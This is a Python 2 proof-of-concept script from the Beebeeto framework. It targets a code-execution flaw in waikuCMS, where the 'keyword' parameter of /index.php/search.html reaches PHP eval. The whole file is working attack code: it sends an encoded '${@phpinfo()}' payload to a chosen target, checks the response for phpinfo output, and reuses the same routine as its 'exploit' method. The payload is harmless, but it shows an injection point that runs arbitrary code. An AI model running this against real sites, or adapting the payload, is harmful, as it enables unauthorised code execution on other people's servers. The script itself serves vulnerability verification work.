#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0062',
            'name': 'waikuCMD /index.php/Search.html 代码执行漏洞 POC',
            'author': 'foxhack',
            'create_date': '2014-10-11',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'waikucms',
            'vul_version': ['*'],
            'type': 'Code Execution',
            'tag': ['waikucms', '代码执行', 'search.html'],
            'desc': 'Search.html 参数 keyword会在一定条件下会带入eval函数，构造代码可造成代码执行',
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-048523',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        vul_url = args['options']['target']+'/index.php/search.html?keyword=%24%7B%40phpinfo%28%29%7D'
        if args['options']['verbose']:
            print '[*] Request URL: ' + vul_url
        response = urllib2.urlopen(urllib2.Request(vul_url)).read()
        if '<title>phpinfo()</title>' in response:
            args['success'] = True
            args['poc_ret']['vul_url'] = vul_url
            return args
        else:
            args['success'] = False
            return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
